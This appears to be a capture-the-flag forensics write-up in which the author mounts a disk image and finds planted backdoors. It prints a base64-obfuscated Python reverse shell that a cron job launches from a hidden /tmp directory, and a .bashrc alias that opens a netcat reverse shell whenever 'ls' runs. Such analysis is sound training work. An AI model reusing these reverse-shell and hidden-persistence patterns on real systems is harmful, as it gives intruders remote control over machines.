Uh Oh it seems a few bad fish got into the fish tank!

Can you find them all?

Challenge File: [badfish.zip](https://ranges.io/event/3d1339dc-d5ab-11ee-9c74-366662326231/file/cb360bb4-d26c-11ee-acd1-626166623361)

Zip Password: bAdFi5h

DISCLAIMER: Flag will start with the number of the challenge it belongs to.

EXAMPLE: 1_This_Is_a_Fake_Flag

Downloaded badfish.img.

Trying to mount. 

First step: 

It seems that you have an image of a harddisk, not a partition. You need to find out at which place in the image the actual partition begins.

```bash
fdisk -l badfish.img
Disk badfish.img: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xae84473a

Device       Boot Start     End Sectors  Size Id Type
badfish.img1 *     2048 2097151 2095104 1023M 83 Linux
```

Fdisk shows offset in sectors, 2048, the mount command needs bytes. Sector size 512 bytes and there are 2048 sectors, so offset in bytes is 512 * 2048 = 1,048,576



`mount -t -msdos -o loop,offset=1048576 badfish.img /media`

Make sure to mount to a better location next time and not all of media

Started looking around, and looked in /tmp.

Found a weird hidden directory `.d` which contained a file daily.py

Contents of daily.py:

```python
import base64

test = ""
for i in ['YmFzZTY0LmI2NGRlY29kZSgnQ21aeWI=', 'MjBnYjNNZ2FXMXdiM0owSUdSMWNESUs=', 'Wm5KdmJTQnpkV0p3Y205alpYTnpJR2w=', 'dGNHOXlkQ0J5ZFc0S2FXMXdiM0owSUg=', 'TnZZMnRsZEFwelBYTnZZMnRsZEM1emI=', 'Mk5yWlhRb2MyOWphMlYwTGtGR1gwbE8=', 'UlZRc2MyOWphMlYwTGxOUFEwdGZVMVI=', 'U1JVRk5LUXB6TG1OdmJtNWxZM1FvS0M=', 'STBYelZ1TTJGcmVWODFia1ZoYTFraUw=', 'RGc0T0RncEtRcGtkWEF5S0hNdVptbHM=', 'Wlc1dktDa3NNQ2tLWkhWd01paHpMbVo=', 'cGJHVnVieWdwTERFcENtUjFjRElvY3k=', 'NW1hV3hsYm04b0tTd3lLUXB5ZFc0b1c=', 'eUl2WW1sdUwySmhjMmdpTENJdGFTSmQ=', 'S1FvPScp']:
    test = test + base64.b64decode(i).decode()
eval(test)
print(test)
```

Added the print command myself and received this output python which contains the flag for number 4:

```python
b'\nfrom os import dup2\nfrom subprocess import run\nimport socket\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("4_5n3aky_5nEakY",8888))\ndup2(s.fileno(),0)\ndup2(s.fileno(),1)\ndup2(s.fileno(),2)\nrun(["/bin/bash","-i"])\n'
```

There is a reference to this file in the cronjobs, cron.d where it points to this file. I assume this was the proper approach to find it. 

Flag 4:

4_5n3aky_5nEakY

Looked in /home for users. Saw user nemo which didn't have much in their home directory besides the typical .profile, .bashrc, and .bash_logout. Checked profile first and left. Eventually came back and checked .bashfc and found flag 2 in this line: `alias ls='ls;nc 2_sM31ly_CaT 4454 -e /bin/bash'`. Will try the netcat to see if that means anything.

Flag 2:

2_sM31ly_CaT

Kept looking around and started scrolling through /usr/bin to find suspicious binaries. Found flag 3 in the dir listing.

Flag 3: 

3_5tr1nGs_r_BaD_4_f15H

